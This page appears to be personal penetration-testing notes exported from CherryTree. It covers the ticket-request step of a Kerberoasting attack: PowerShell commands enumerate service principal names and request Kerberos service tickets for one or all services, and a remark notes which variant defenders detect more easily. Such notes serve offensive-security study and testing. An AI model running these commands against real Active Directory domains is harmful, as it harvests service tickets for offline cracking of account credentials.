<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Request ServiceTicket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. Request ServiceTicket</h1><br/><br />Displays a list of currently cached Kerberos tickets granted to the current logon session<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; klist.exe</pre></div><br /><br /><strong>Request new </strong><strong><span style="color:#ff00e0;">ServiceTicket</span></strong><strong> for a service:</strong><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; setspn <span style="color:#ff9d00;font-weight:700">-</span>T [DOMAIN] <span style="color:#ff9d00;font-weight:700">-</span>F <span style="color:#ff9d00;font-weight:700">-</span>Q <span style="color:#ff9d00;font-weight:700">*/*</span></pre></div><br />    <a href=""><img src="images/1132-1.png" alt="images/1132-1.png" /></a><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Add-Type</span> <span style="color:#ff9d00;font-weight:700">-</span>AssemblyName System.IdentityModel<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span style="color:#ff9d00;font-weight:700">-</span>ArgumentList <span style="color:#3ad900;font-weight:400">&quot;TESTDC/SQLService.DANIELE.local:60111&quot;</span>  <span style="color:#0088ff;font-weight:400">#change DANIELE</span><br />                                                                                                                                 <span style="color:#0088ff;font-weight:400">#to your domain</span><br /></pre></div><br />    <a href=""><img src="images/1132-2.png" alt="images/1132-2.png" /></a><br />Now we should have a new ticket for the service cached on the system<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; klist.exe</pre></div>    <br />    <a href=""><img src="images/1132-3.png" alt="images/1132-3.png" /></a><br /><br /><strong>Request </strong><strong><span style="color:#ff00e0;">ServiceTicket</span></strong><strong> for all the services:</strong><br />More easily detectable by Defenders!<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Add-Type</span> <span style="color:#ff9d00;font-weight:700">-</span>AssemblyName System.IdentityModel<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; setspn <span style="color:#ff9d00;font-weight:700">-</span>T [DOMAIN] <span style="color:#ff9d00;font-weight:700">-</span>Q <span style="color:#ff9d00;font-weight:700">*/*</span> | <span style="color:#ff9d00;font-weight:700">Select-String</span> <span style="color:#3ad900;font-weight:400">&quot;CN=Users&quot;</span> <span style="color:#ff9d00;font-weight:700">-</span>Context <span style="color:#333333;font-weight:400">0</span>,<span style="color:#333333;font-weight:400">1</span> | <span style="color:#ff9d00;font-weight:700">%</span> { <span style="color:#ff9d00;font-weight:700">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span style="color:#ff9d00;font-weight:700">-</span>ArgumentList <span style="color:#0088ff;font-weight:400">$_</span>.Context.PostContext[<span style="color:#333333;font-weight:400">0</span>].Trim() }</pre></div><br />    <a href=""><img src="images/1132-4.png" alt="images/1132-4.png" /></a><br />Alternative using script GetUserSPNs.ps1 from <a href="https://github.com/nidem/kerberoast">Kerberoast</a> project of Tim Medin<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Add-Type</span> <span style="color:#ff9d00;font-weight:700">-</span>AssemblyName System.IdentityModel<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; .<span style="color:#ff9d00;font-weight:700">\</span>GetUserSPNs.ps1 | <span style="color:#ff9d00;font-weight:700">%</span> {<span style="color:#ff9d00;font-weight:700">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span style="color:#ff9d00;font-weight:700">-</span>ArgumentList <span style="color:#0088ff;font-weight:400">$_</span>.ServicePrincipalName}</pre></div><br />    <a href=""><img src="images/1132-5.png" alt="images/1132-5.png" /></a><br /></div>
</body>
</html>
